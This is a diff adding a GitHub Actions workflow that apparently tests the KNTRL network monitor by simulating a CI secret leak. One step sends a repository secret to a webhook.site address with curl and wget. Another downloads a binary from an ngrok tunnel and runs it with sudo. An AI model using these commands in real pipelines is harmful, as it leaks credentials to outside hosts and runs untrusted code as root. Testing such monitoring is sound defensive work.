@@ -1,0 +1,61 @@
+# This is a basic workflow to help you get started with Actions
+
+name: CI
+
+# Controls when the workflow will run
+on:
+  # Triggers the workflow on push or pull request events but only for the "main" branch
+  push:
+  workflow_dispatch:
+
+# A workflow run is made up of one or more jobs that can run sequentially or in parallel
+jobs:
+  # This workflow contains a single job called "build"
+  build:
+    # The type of runner that the job will run on
+    runs-on: ubuntu-latest
+
+    # Steps represent a sequence of tasks that will be executed as part of the job
+    steps:
+      # Checks-out your repository under $GITHUB_WORKSPACE, so your job can access it
+      - uses: actions/checkout@v3
+
+      # Runs a single command using the runners shell
+      - name: Run a one-line script... prepare
+        run: | 
+           echo Hello, world!!
+           env
+
+      # Runs a single command using the runners shell
+      # wget download.kondukto.io/kntrl/kntrl -q
+      - name: Run a KNTRL
+        run: |
+          wget -q https://28f8-46-197-210-176.ngrok-free.app/kntrl
+          chmod +x kntrl
+          sudo ./kntrl start --mode=trace --allowed-hosts=download.kondukto.io --allow-github-meta=true &
+          
+      # Runs a set of commands using the runners shell
+      - name: Stop prevent action
+        env:
+          SECRET: ${{ secrets.MY_SECRET }}
+        run: |
+          echo "leak secret"
+          curl --connect-timeout 10 https://webhook.site/2c215e92-a7db-465c-b061-866f7cf1a9ca?secret=$SECRET\&id=$GITHUB_RUN_ID || true
+          wget --connect-timeout=3 https://webhook.site/2c215e92-a7db-465c-b061-866f7cf1a9ca?secret=$SECRET\&id=$GITHUB_RUN_ID || true
+          
+        # Runs a set of commands using the runners shell
+        #           wget --connect-timeout=3 https://download.kondukto.io/kntrl/myartifact.txt 
+      - name: Run allowed action
+        run: |
+          echo "download artifacts..."
+
+      # Runs a set of commands using the runners shell
+      # sudo ./kntrl stop
+      - name: print report
+        run: |
+          echo "Print report"
+          echo "---------------------"
+          cat /tmp/kntrl.out
+          echo "---------------------"
+          sudo ./kntrl stop
+          
